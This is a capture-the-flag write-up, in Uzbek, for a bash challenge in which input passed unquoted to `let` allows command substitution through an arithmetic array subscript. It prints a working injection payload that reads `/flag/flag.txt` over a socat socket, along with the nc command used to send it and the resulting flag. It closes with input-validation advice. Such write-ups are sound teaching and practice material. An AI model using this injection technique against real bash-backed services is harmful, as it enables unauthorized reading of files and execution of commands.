# Bish Bash Bosh (Misc)

## Topshiriq

> *Let* me just quickly bash something together so you can't get my `/flag/flag.txt`.

TCP xizmat (socat) har bir ulanish uchun shu skriptni ishga tushiradi:

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

Flag massivning 0-elementi, diapazon tekshiruvi esa 0-indeksni bloklaydi.

## Zaiflik

Tavsifdagi kursiv *Let* so'zi ishora. `let` o'z argumentini **bash arifmetik ifodasi** sifatida hisoblaydi, bizning kiritganimiz esa unga qo'shtirnoqsiz qo'yiladi.

Bash arifmetikasida `a[...]` kabi massiv indeksi ham hisoblanadi, indeks ichidagi `$(...)` buyruq almashtirishi esa ishga tushadi. Demak kiritilgan qiymat shunchaki raqam emas: u diapazon tekshiruvidan oldinroq buyruq bajarishi mumkin.

## Ekspluatatsiya

Payload:

```
a[$(cat${IFS}/flag/flag.txt>&0)]
```

- `${IFS}` bo'sh joy o'rnini bosadi (bo'sh joy argumentni bo'lib yuborardi).
- `>&0` `cat` chiqishini 0-fayl deskriptoriga yuboradi. socat `EXEC` da stdin tarmoq soketi bo'lgani uchun chiqish to'g'ridan-to'g'ri bizga qaytadi.
- Shundan keyin skript baribir `Nuh uh` deb chiqaradi, lekin flag allaqachon yuborilgan bo'ladi.

```bash
printf '%s\n' 'a[$(cat${IFS}/flag/flag.txt>&0)]' | nc -N HOST 9000
```

Natija:

```
What message would you like to see? (0..2)
PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}Nuh uh
```

Payload'ni avval skriptning nusxasida lokal sinab ko'rdim, keyin nishonga bir marta yubordim.

## Flag

`PP{l3t_t00k_my_fl4g!!!::dtUQgusHeuoX}`

## Xulosa

Foydalanuvchi kiritgan ma'lumotni hech qachon bash'dagi `let`, `(( ))` yoki `$(( ))` ga bermang. Har qanday arifmetikadan oldin uni tekshiring, masalan `[[ $i =~ ^[0-9]+$ ]]` bilan.
